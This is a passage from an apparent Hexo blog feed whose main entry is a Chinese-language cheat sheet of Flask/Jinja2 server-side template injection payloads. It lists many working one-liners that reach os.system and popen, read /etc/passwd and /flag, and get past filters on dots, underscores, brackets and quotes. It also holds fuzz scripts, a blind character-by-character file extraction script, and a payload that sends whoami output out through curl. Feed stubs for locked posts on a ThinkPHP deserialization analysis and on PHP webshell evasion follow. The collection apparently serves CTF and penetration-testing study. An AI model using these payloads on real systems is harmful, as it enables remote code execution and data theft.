fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure><p>可构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) </span><br><span class="line"></span><br><span class="line"># 带回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>一般payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-03-Python3-环境测试"><a href="#0x-03-Python3-环境测试" class="headerlink" title="0x 03 Python3 环境测试"></a>0x 03 Python3 环境测试</h3><p>类似于Python2的,常用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&quot;ls&quot;).read()</span><br><span class="line"># &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br><span class="line"># &lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat</span><br><span class="line">&#x2F;flag&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块,fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;system&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;system&#39;,num,item)</span><br><span class="line">         if &#39;sys&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;sys&#39;,num,item)</span><br><span class="line">         if &#39;__builtins__&#39; in item.__init__.__globals__:</span><br><span class="line">          print(&#39;__builtins__&#39;,num,item)</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>Jinja2的for循环处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-04-ByPass"><a href="#0x-04-ByPass" class="headerlink" title="0x 04 ByPass"></a>0x 04 ByPass</h3><p><strong><code>.</code>被过滤</strong></p><p>基础payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>使用<code>getattr()</code>或者<code>|attr()</code>或者<code>[]</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__&#x3D;&gt;getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__&#x3D;&gt;getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]&#x3D;&gt;getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__&#x3D;&gt;getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>其他</p><p>Flask在渲染模板的时候，有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__&#x3D;&#x3D;&#x3D;&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure><p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。</p><p>由于里面的内容已经是字符串了，还可以做一个这样的变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__&#x3D;&#x3D;&#x3D;&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;]</span><br></pre></td></tr></table></figure><p><strong><code>_</code>被过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line"># &#39;__class__&#39;&#x3D;&#x3D;&gt;dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2</span><br></pre></td></tr></table></figure><p><strong>中括号被过滤</strong></p><p>可以用<code>getitem</code>或者<code>pop</code>进行绕过过滤</p><ul><li>读取文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.linecache.os.pop</span><br></pre></td></tr></table></figure><p><strong>引号被过滤</strong></p><ul><li>chr函数绕过过滤</li></ul><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>借助request对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><ul><li>过滤引号下的命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>过滤双括号</strong></p><ul><li>盲命令执行：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200407002155982.png" alt></p><ul><li>文件盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:5000?name&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload&#x3D;&quot;&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;lihuaiqiu&#39;).read()[&quot;+str(i)+&quot;:&quot;+str(i+1)+&quot;]&#x3D;&#x3D;&#39;&quot;+chr(j)+&quot;&#39; %&#125;~ok~&#123;% endif %&#125;&quot;</span><br><span class="line">        true_url&#x3D;url+payload</span><br><span class="line">        r&#x3D;requests.get(true_url)</span><br><span class="line">        if &#39;ok&#39; in r.text:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure><h3 id="0x-05-过滤trick"><a href="#0x-05-过滤trick" class="headerlink" title="0x 05 过滤trick"></a>0x 05 过滤trick</h3><p><strong>Python的一切皆对象思想</strong></p><p>过滤掉了<code>class和request</code>,通过<code>session</code>构造出<code>object</code>，payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure><p><strong><code>__enter__与__init__</code>的相似性</strong></p><p>通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p><ul><li>利用转义字符（16进制）过滤<code>.</code>和<code>_</code></li></ul><blockquote><p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>利用requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure><h3 id="0x-06-最后总结"><a href="#0x-06-最后总结" class="headerlink" title="0x 06 最后总结"></a>0x 06 最后总结</h3><p><strong>Python 2.7</strong></p><p>jinja2的for循环一把梭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>Python 3.7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>fuzz脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>jinja2判断</li></ul><p><code>49</code>:jinja2 返回的是 7777777 ，通过测试可以确定为 jinja2 </p><h3 id="0x-07-推荐工具"><a href="#0x-07-推荐工具" class="headerlink" title="0x 07 推荐工具"></a>0x 07 推荐工具</h3><p>一把梭： <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>payload 合集：[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</p><blockquote><p>参考资料</p><p><a href="https://glotozz.github.io/2020/02/24/flask模版注入/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/24/flask模版注入/</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;参考这篇文章：&lt;a href=&quot;https://w
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="flask模板注入" scheme="http://yoursite.com/tags/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0.x反序列化分析(一)</title>
    <link href="http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-04-05T05:43:10.000Z</published>
    <updated>2020-04-05T12:26:19.581Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dcdfba4d3eb398d9fae1cea0f79d026a1d1fa33b3d4593f2ddfa60849bde109e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="ThinkPHP 6.0.x反序列化" scheme="http://yoursite.com/tags/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>D盾免杀PHPWebshell总结</title>
    <link href="http://yoursite.com/2020/04/03/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/03/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-03T03:13:38.000Z</published>
    <updated>2020-04-03T06:51:36.602Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="795a5f7748863f22cc0f26392fa34f57fdc937820c1f30117fe66b21bbb6e21a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="D盾免杀PHPWebshell" scheme="http://yoursite.com/tags/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（四）</title>
    <link href="http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-04-01T14:00:37.000Z</published>
    <updated>2020-04-28T01:23:57.763Z</updated>
    
